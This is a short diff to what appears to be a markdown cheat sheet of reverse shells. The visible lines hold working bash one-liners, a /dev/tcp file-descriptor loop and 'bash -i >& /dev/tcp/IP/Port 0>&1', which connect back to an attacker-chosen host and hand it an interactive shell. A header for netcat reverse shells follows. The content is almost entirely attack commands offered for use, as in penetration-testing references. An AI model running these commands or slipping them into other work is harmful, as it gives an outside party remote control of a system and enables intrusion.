@@ -3,11 +3,15 @@
 ## Bash reverse shells
 
 exec 100<>/dev/tcp/**IP**/**Port** 
+
 cat <&100 | while read line; do $line 2>&100 >&100; done 
+
 Or:
+
 while read line 0<&100; do $line 2>&100 >&100; done
 
 A bash reverse shell one-liner:
+
 bash -i >& /dev/tcp/**IP**/**Port** 0>&1 
 
 ## Netcat reverse shell
